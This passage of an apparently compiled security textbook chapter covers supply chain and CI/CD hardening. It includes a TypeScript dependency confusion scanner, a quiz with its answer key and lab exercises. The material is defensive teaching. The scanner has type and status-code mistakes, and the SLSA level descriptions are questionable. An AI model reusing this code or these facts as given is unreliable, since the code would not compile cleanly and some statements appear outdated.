+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Build"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cosign"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Artifact signing"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Every release"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Build"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SLSA provenance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Provenance attestation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Every release"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Container"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Trivy, Grype"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Container scan"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Image build"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Staging"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OWASP ZAP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DAST scan"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Pre-release"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "Production"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Falco, Sysdig"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Runtime monitoring"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Continuous"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1683-dependency-confusion-scanner-typescript",
+      children: "16.8.3 Dependency Confusion Scanner (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Dependency Confusion Scanner\n *\n * Checks if private package names exist in public registries,\n * which would indicate a dependency confusion risk.\n */\n\nimport * as https from 'https';\nimport * as http from 'http';\n\n/* ─── Type Definitions ─── */\n\ninterface PackageInfo {\n  name: string;\n  version: string;\n  isScoped: boolean;\n  scope?: string;\n}\n\ninterface RegistryCheckResult {\n  packageName: string;\n  registryURL: string;\n  existsInRegistry: boolean;\n  latestVersion: string | null;\n  riskLevel: 'NONE' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';\n  details: string;\n}\n\ninterface DependencyConfusionReport {\n  scannedAt: string;\n  totalPackages: number;\n  totalScoped: number;\n  totalUnscoped: number;\n  results: RegistryCheckResult[];\n  summary: {\n    critical: number;\n    high: number;\n    medium: number;\n    low: number;\n    none: number;\n  };\n}\n\n/* ─── Registry Checker ─── */\n\nclass DependencyConfusionScanner {\n  private readonly publicRegistries: string[];\n  private readonly privatePackagePatterns: string[];\n  private readonly timeoutMs: number;\n\n  constructor(\n    options: {\n      publicRegistries?: string[];\n      privatePackagePatterns?: string[];\n      timeoutMs?: number;\n    } = {}\n  ) {\n    this.publicRegistries = options.publicRegistries ?? [\n      'https://registry.npmjs.org',\n      'https://registry.npmjs.org/@%s',\n    ];\n    this.privatePackagePatterns = options.privatePackagePatterns ?? [\n      // Common patterns for internal packages\n      /^internal-/,\n      /^private-/,\n      /^-lib$/,\n      /^@company\\//,\n      /^@org\\//,\n      /^@internal\\//,\n    ];\n    this.timeoutMs = options.timeoutMs ?? 5000;\n  }\n\n  /**\n   * Fetch JSON from a URL with timeout.\n   */\n  private async fetchJSON(url: string): Promise<unknown> {\n    return new Promise((resolve, reject) => {\n      const protocol = url.startsWith('https') ? https : http;\n      const req = protocol.get(url, { timeout: this.timeoutMs }, (res) => {\n        let data = '';\n        res.on('data', (chunk: string) => (data += chunk));\n        res.on('end', () => {\n          try {\n            resolve(JSON.parse(data));\n          } catch {\n            reject(new Error(`Failed to parse JSON from ${url}`));\n          }\n        });\n      });\n      req.on('error', (err: Error) => reject(err));\n      req.on('timeout', () => {\n        req.destroy();\n        reject(new Error(`Request to ${url} timed out`));\n      });\n    });\n  }\n\n  /**\n   * Check if a package exists in the npm registry.\n   */\n  private async checkNPMPackage(packageName: string): Promise<{\n    exists: boolean;\n    latestVersion: string | null;\n  }> {\n    const url = packageName.startsWith('@')\n      ? `https://registry.npmjs.org/${encodeURIComponent(packageName)}`\n      : `https://registry.npmjs.org/${packageName}`;\n\n    try {\n      const response = (await this.fetchJSON(url)) as Record<string, unknown>;\n      if (response && typeof response === 'object' && 'name' in response) {\n        const distTags = response['dist-tags'] as Record<string, string> | undefined;\n        return {\n          exists: true,\n          latestVersion: distTags?.latest ?? null,\n        };\n      }\n      return { exists: false, latestVersion: null };\n    } catch (error) {\n      // 404 or network error — package doesn't exist publicly\n      if (error instanceof Error && error.message.includes('406')) {\n        return { exists: false, latestVersion: null };\n      }\n      return { exists: false, latestVersion: null };\n    }\n  }\n\n  /**\n   * Parse package names from a package.json or lock file content.\n   */\n  parsePackageNames(content: string): PackageInfo[] {\n    const packages: PackageInfo[] = [];\n\n    try {\n      const pkgJson = JSON.parse(content) as Record<string, unknown>;\n\n      const deps: Record<string, string> = {\n        ...(pkgJson.dependencies as Record<string, string> ?? {}),\n        ...(pkgJson.devDependencies as Record<string, string> ?? {}),\n      };\n\n      for (const [name, version] of Object.entries(deps)) {\n        const isScoped = name.startsWith('@');\n        packages.push({\n          name,\n          version,\n          isScoped,\n          scope: isScoped ? name.split('/')[0] : undefined,\n        });\n      }\n    } catch {\n      // If not valid JSON, try line-by-line parsing for lock files\n      const lines = content.split('\\n');\n      const depRegex = /^\\s+\"([^\"]+)\":\\s*\\{/;\n      for (const line of lines) {\n        const match = line.match(depRegex);\n        if (match) {\n          const name = match[1];\n          if (name && !name.startsWith('node_modules/') && !name.startsWith('@')) {\n            packages.push({ name, version: 'unknown', isScoped: false });\n          }\n        }\n      }\n    }\n\n    return packages;\n  }\n\n  /**\n   * Determine if a package name looks like it might be private.\n   */\n  private isLikelyPrivate(packageName: string): boolean {\n    return this.privatePackagePatterns.some((pattern) => pattern.test(packageName));\n  }\n\n  /**\n   * Scan dependencies for dependency confusion risks.\n   */\n  async scan(\n    packageJsonContent: string\n  ): Promise<DependencyConfusionReport> {\n    const packages = this.parsePackageNames(packageJsonContent);\n    const results: RegistryCheckResult[] = [];\n\n    for (const pkg of packages) {\n      const isLikelyPrivate = this.isLikelyPrivate(pkg.name);\n\n      if (pkg.isScoped) {\n        // Scoped packages (@scope/name) are safe from confusion\n        // by default because they can only come from a configured registry\n        results.push({\n          packageName: pkg.name,\n          registryURL: 'https://registry.npmjs.org',\n          existsInRegistry: false,\n          latestVersion: null,\n          riskLevel: 'NONE',\n          details: 'Scoped package — dependency confusion not applicable if scope is configured to private registry.',\n        });\n        continue;\n      }\n\n      // Check if the package exists in the public registry\n      const publicInfo = await this.checkNPMPackage(pkg.name);\n\n      if (publicInfo.exists) {\n        // Package exists publicly — this is the confusion risk\n        const riskLevel = isLikelyPrivate ? 'CRITICAL' : 'HIGH';\n        results.push({\n          packageName: pkg.name,\n          registryURL: 'https://registry.npmjs.org',\n          existsInRegistry: true,\n          latestVersion: publicInfo.latestVersion,\n          riskLevel,\n          details: isLikelyPrivate\n            ? `Package \"${pkg.name}\" looks like a private/internal package ` +\n              `(matches pattern) but EXISTS in public registry! CRITICAL confusion risk.`\n            : `Package \"${pkg.name}\" exists in public registry ` +\n              `(latest: ${publicInfo.latestVersion}). If this is meant to be private, ` +\n              `use a scope (@scope/package) and configure .npmrc.`,\n        });\n      } else {\n        // Package does not exist publicly — no confusion risk\n        results.push({\n          packageName: pkg.name,\n          registryURL: 'https://registry.npmjs.org',\n          existsInRegistry: false,\n          latestVersion: null,\n          riskLevel: isLikelyPrivate ? 'LOW' : 'NONE',\n          details: isLikelyPrivate\n            ? `Package \"${pkg.name}\" looks like a private package and does NOT exist ` +\n              `in public registry. Low risk, but consider scoping it.`\n            : `Package \"${pkg.name}\" does not exist in public registry. No confusion risk.`,\n        });\n      }\n    }\n\n    const summary = {\n      critical: results.filter((r) => r.riskLevel === 'CRITICAL').length,\n      high: results.filter((r) => r.riskLevel === 'HIGH').length,\n      medium: results.filter((r) => r.riskLevel === 'MEDIUM').length,\n      low: results.filter((r) => r.riskLevel === 'LOW').length,\n      none: results.filter((r) => r.riskLevel === 'NONE').length,\n    };\n\n    return {\n      scannedAt: new Date().toISOString(),\n      totalPackages: packages.length,\n      totalScoped: packages.filter((p) => p.isScoped).length,\n      totalUnscoped: packages.filter((p) => !p.isScoped).length,\n      results,\n      summary,\n    };\n  }\n}\n\n// ─── Demonstrations ───\n\nasync function demonstrateDependencyConfusionScanner(): Promise<void> {\n  const scanner = new DependencyConfusionScanner({\n    privatePackagePatterns: [\n      /^internal-/,\n      /^private-/,\n      /^company-/,\n      /^myapp-/,\n    ],\n  });\n\n  const mockPackageJson = JSON.stringify({\n    name: 'my-enterprise-app',\n    version: '1.0.0',\n    dependencies: {\n      'express': '^4.18.0',\n      'lodash': '^4.17.21',\n      'internal-auth-lib': '^2.0.0',\n      'private-api-client': '^1.5.0',\n      '@company/shared-ui': '^3.0.0',\n      'react': '^18.2.0',\n    },\n    devDependencies: {\n      'typescript': '^5.4.0',\n      'myapp-test-utils': '^1.0.0',\n    },\n  });\n\n  console.log('=== Dependency Confusion Scan ===');\n  const report = await scanner.scan(mockPackageJson);\n\n  console.log(`Total packages: ${report.totalPackages}`);\n  console.log(`  Scoped: ${report.totalScoped}`);\n  console.log(`  Unscoped: ${report.totalUnscoped}`);\n  console.log(`\\nRisk Summary:`);\n  console.log(`  CRITICAL: ${report.summary.critical}`);\n  console.log(`  HIGH: ${report.summary.high}`);\n  console.log(`  MEDIUM: ${report.summary.medium}`);\n  console.log(`  LOW: ${report.summary.low}`);\n  console.log(`  NONE: ${report.summary.none}`);\n\n  console.log('\\nDetails:');\n  for (const result of report.results) {\n    console.log(`  [${result.riskLevel}] ${result.packageName}`);\n    console.log(`    ${result.details}`);\n  }\n}\n\nvoid demonstrateDependencyConfusionScanner();\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "practical-takeaways",
+      children: "Practical Takeaways"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Takeaway"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Application"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Generate SBOMs for every build artifact"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Integrate CycloneDX or SPDX generation into your CI/CD pipeline using Syft or CycloneDX CLI"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Pin all CI/CD actions to commit SHAs"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: ["Audit workflows and replace version tags (", (0,jsx_runtime.jsx)(_components.code, {
+              children: "@v3"
+            }), ") with full commit hashes to prevent supply chain injection"]
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Scope CI/CD token permissions to minimum"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: ["Set ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "permissions: read-all"
+            }), " at the workflow level and override only where write access is strictly required"]
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Use ephemeral runners for all CI jobs"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Replace persistent self-hosted runners with single-use containers or GitHub-hosted runners to prevent secret leakage"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Scan all dependencies and containers in CI"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: ["Add ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "npm audit"
+            }), "/", (0,jsx_runtime.jsx)(_components.code, {
+              children: "trivy"
+            }), "/", (0,jsx_runtime.jsx)(_components.code, {
+              children: "grype"
+            }), " scanning steps after dependency install and container build"]
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Sign all artifacts with Sigstore/Cosign"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Implement keyless signing in CI; verify signatures at deployment to detect tampering"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Implement SLSA provenance attestation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Generate in-toto attestations at build time; require L3+ provenance for production deployments"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "summary",
+      children: "Summary"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "This chapter covered the critical topic of software supply chain and CI/CD pipeline security:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Supply Chain Attacks"
+          }), " — We analyzed real-world attacks including SolarWinds (Sunburst), Codecov, Log4j, dependency confusion, and typosquatting. These attacks demonstrate that the software supply chain is a high-value target where compromising one upstream component can cascade to thousands of downstream consumers."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "SBOM (Software Bill of Materials)"
+          }), " — SBOMs provide a machine-readable inventory of all software components. We implemented a CycloneDX SBOM generator that parses ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "package.json"
+          }), " and ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "node_modules"
+          }), " to produce a structured document. Tools like Syft, Trivy, and CycloneDX CLI automate SBOM generation."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Dependency Security"
+          }), " — We built a dependency vulnerability checker that compares dependencies against a CVE database. We covered tools like ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "npm audit"
+          }), ", OWASP Dependency Check, Snyk, and GitHub Dependabot. Transitive dependencies represent a significant blind spot that requires deep dependency graph analysis."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "CI/CD Pipeline Hardening"
+          }), " — We implemented a CI/CD pipeline security auditor that checks for common misconfigurations including unpinned actions, missing permission scoping, hardcoded secrets, Docker socket mounts, and missing SBOM generation. The CI/CD hardening checklist provided 20 actionable security controls."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "Artifact Integrity"
+          }), " — We explored Sigstore/Cosign for container signing and verification, and implemented a software artifact hash verifier. These tools ensure that artifacts haven't been tampered with between build and deployment."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "SLSA Framework"
+          }), " — We implemented a SLSA provenance attestation builder that generates in-toto attestations conforming to SLSA v1. The SLSA model provides a graduated path from no guarantees (L0) to maximum security (L4) with two-person review and reproducibility."]
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
+          children: [(0,jsx_runtime.jsx)(_components.strong, {
+            children: "DevSecOps Integration"
+          }), " — We covered the integration of SAST, DAST, secrets scanning, container scanning, and fuzzing into CI/CD pipelines. The dependency confusion scanner demonstrated how to proactively identify one of the most common supply chain risks."]
+        }), "\n"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "chapter-quiz--supply-chain--cicd-pipeline-security",
+      children: "Chapter Quiz — Supply Chain & CI/CD Pipeline Security"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "#"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Question"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "A"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "B"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "C"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "D"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Answer"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "1"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What was the primary mechanism used by the SolarWinds (Sunburst) attackers to distribute the backdoor?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Phishing emails with malicious attachments"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Compromising the SolarWinds build pipeline to inject code into signed Orion updates"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Exploiting a zero-day vulnerability in the Orion web console"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Social engineering SolarWinds employees to reveal credentials"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What is an SBOM?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A bill of materials for hardware components in data centers"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A machine-readable inventory of all software components, versions, and dependencies in an application"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A security baseline operating model for DevSecOps teams"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A build optimization methodology for container images"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "3"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which SLSA level requires two-person review for all build steps?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SLSA L1"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SLSA L2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SLSA L3"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SLSA L4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "D"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "In a dependency confusion attack, an attacker:"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Modifies the source code of a popular open-source library"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Publishes a package with the same name as a private package to a public registry with a higher version number"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Plants malicious code in a CI/CD pipeline configuration"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Intercepts network traffic to steal package credentials"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "5"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which tool is part of the Sigstore project for signing container images?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Trivy"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cosign"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Syft"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Grype"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "6"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What is the purpose of generating a provenance attestation in a CI/CD pipeline?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "To measure build performance metrics"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "To create an auditable record of how an artifact was built, by whom, and from what source"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "To comply with GDPR data retention requirements"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "To generate API documentation automatically"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which of the following is a valid defense against typosquatting attacks?"
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: ["Always installing packages with ", (0,jsx_runtime.jsx)(_components.code, {
+              children: "--save-exact"
+            }), " flag"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Using a package allowlist and implementing Levenshtein distance checks on package names"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Disabling npm audit in CI/CD pipelines"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Only using devDependencies in production builds"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "8"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What is a primary risk of using self-hosted CI/CD runners?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Slower build times compared to cloud runners"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Persistent state between builds may leak secrets from previous runs"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Self-hosted runners cannot cache dependencies"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "They cannot run containerized builds"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "9"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What does a \"hermetic build\" mean in the context of SLSA?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "The build runs in an isolated container"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "The build is fully sealed and does not access the network for any purpose — all dependencies are pre-fetched and verified"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "The build output is encrypted before storage"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "The build is reproducible across different operating systems"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "B"
+            })
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "10"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which of the following is an example of a SAST (Static Application Security Testing) tool?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OWASP ZAP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Trivy"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "CodeQL"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Falco"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "C"
+            })
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "exercises",
+      children: "Exercises"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
+        children: "Solution"
+      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-1-sbom-analysis-and-validation",
+        children: "Exercise 1: SBOM Analysis and Validation"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Generate and validate an SBOM for a real or simulated project."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Create a ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "package.json"
+          }), " with 5+ dependencies (including some with known vulnerabilities)."]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Extend the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "CycloneDXSBOMGenerator"
+          }), " to support outputting SPDX format in addition to CycloneDX."]
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Run the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "CycloneDXValidator"
+          }), " on the generated SBOM and fix any validation errors."]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Add license URL resolution — for each component, fetch the license URL from the npm registry."
+        }), "\n"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Deliverable:"
+        }), " Generated SBOM JSON file + validation report."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+        id: "exercise-2-cicd-pipeline-security-audit",
+        children: "Exercise 2: CI/CD Pipeline Security Audit"
+      }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Objective:"
+        }), " Audit a sample GitHub Actions workflow for security misconfigurations."]
+      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+        children: (0,jsx_runtime.jsx)(_components.strong, {
+          children: "Tasks:"
+        })
+      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Create a GitHub Actions workflow with at least 5 deliberate misconfigurations (e.g., unpinned actions, missing permissions, hardcoded secrets, Docker socket mount, self-hosted runner)."
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+          children: ["Run the ", (0,jsx_runtime.jsx)(_components.code, {
+            children: "CICDPipelineAuditor"
+          }), " against your workflow."]
+        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+          children: "Fix all issues identified in the audit report."
+        }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
